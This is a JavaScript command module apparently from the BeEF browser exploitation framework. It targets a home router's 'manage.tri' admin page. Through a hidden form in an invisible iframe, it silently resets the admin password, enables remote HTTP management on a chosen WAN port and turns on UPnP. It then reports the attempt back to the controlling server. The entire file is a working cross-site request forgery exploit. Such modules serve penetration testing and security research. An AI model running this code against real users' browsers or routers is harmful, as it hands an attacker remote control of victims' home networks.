//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var port = '<%= @port %>';
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var target = gateway + "manage.tri";

  var iframe = beef.dom.createInvisibleIframe();

  var form = document.createElement('form');
  form.setAttribute('action', target);
  form.setAttribute('method', 'post');

  var input = null;

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'remote_mgt_https');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'http_enable');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'https_enable');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'PasswdModify');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'http_passwd');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'http_passwdConfirm');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', '_http_enable');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'web_wl_filter');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'remote_management');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'http_wanport');
  input.setAttribute('value', port);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'upnp_enable');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'layout');
  input.setAttribute('value', 'en');
  form.appendChild(input);

  iframe.contentWindow.document.body.appendChild(form);
  form.submit();

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
});
